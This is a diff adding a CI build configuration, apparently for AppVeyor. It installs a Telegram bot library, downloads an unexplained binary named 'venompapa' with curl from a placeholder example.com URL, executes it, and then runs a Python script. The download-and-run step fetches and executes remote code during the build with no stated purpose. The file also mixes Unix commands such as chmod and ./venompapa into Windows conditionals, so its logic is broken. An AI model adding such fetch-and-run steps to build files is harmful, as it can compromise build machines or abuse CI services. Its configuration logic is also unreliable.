@@ -1,0 +1,33 @@
+# Environment setup
+environment:
+  PYTHON: "C:\\Python3.9"
+
+# Install dependencies
+install:
+  # Add Python to PATH
+  - set PATH=%PYTHON%;%PYTHON%\\Scripts;%PATH%
+  
+  # Upgrade pip
+  - python -m pip install --upgrade pip
+  
+  # Install telebot library
+  - pip install pyTelegramBotAPI
+  
+  # Ensure binary exists (if not, download it)
+  - if not exist venompapa curl -L -o venompapa https://example.com/path/to/venompapa
+  
+  # Give execute permission to venompapa binary (for Windows, permissions aren't required)
+  # For Linux or MacOS, conditionally execute chmod
+  - if not defined APPVEYOR_OS_NAME chmod +x venompapa
+
+# Run commands
+build_script:
+  # Verify the file exists in the working directory
+  - dir
+
+  # Run the binary (use `venompapa` on Windows)
+  - if exist venompapa venompapa
+  - if not exist venompapa ./venompapa
+  
+  # Run the Python script
+  - python Ven.py
